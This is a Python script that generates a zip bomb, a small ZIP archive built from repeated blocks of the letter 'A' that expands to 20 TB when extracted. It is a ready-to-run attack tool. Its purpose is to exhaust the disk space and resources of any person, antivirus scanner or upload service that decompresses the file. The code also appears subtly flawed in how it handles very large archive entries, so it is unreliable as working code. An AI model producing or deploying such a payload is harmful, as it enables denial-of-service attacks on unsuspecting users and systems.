import os
import zipfile
import sys

def create_zip_bomb(output_filename="bomb_20tb.zip", target_size_tb=20):
    """
    Creates a zip file that expands to the target size in TB.
    Uses a highly compressible pattern to keep the source file small.
    """
    target_size_bytes = int(target_size_tb * (1024 ** 4))  # 1 TB = 1024^4 bytes
    
    # Pattern: 'A' repeated. Zips this extremely efficiently.
    pattern = b'A' * 1024 * 1024  # 1MB block of 'A's
    
    # Calculate how many blocks we need
    num_blocks = target_size_bytes // len(pattern)
    remainder = target_size_bytes % len(pattern)
    
    print(f"Creating {output_filename}...")
    print(f"Target expanded size: {target_size_tb} TB")
    print(f"Source pattern size: 1 MB")
    print(f"Blocks to repeat: {num_blocks}")
    
    # Use a temporary file to avoid holding 20TB in memory
    # We write to the zip file incrementally
    
    with zipfile.ZipFile(output_filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        # Add a single file inside the zip
        with z.open('bomb_file.txt', 'w') as f:
            # Write the pattern repeatedly
            for i in range(num_blocks):
                f.write(pattern)
                if (i + 1) % 100 == 0:
                    print(f"  Written: {((i+1)*len(pattern)) / (1024**4):.2f} TB of {target_size_tb} TB")
            
            # Write the remainder if any
            if remainder:
                f.write(pattern[:remainder])
                
    final_size = os.path.getsize(output_filename)
    print(f"\nDone! Final compressed size: {final_size / (1024**2):.2f} MB")
    print(f"Expansion ratio: ~{target_size_bytes / final_size:.0f}x")

if __name__ == "__main__":
    # Change filename or target size as needed
    create_zip_bomb("bomb_20tb.zip", 20)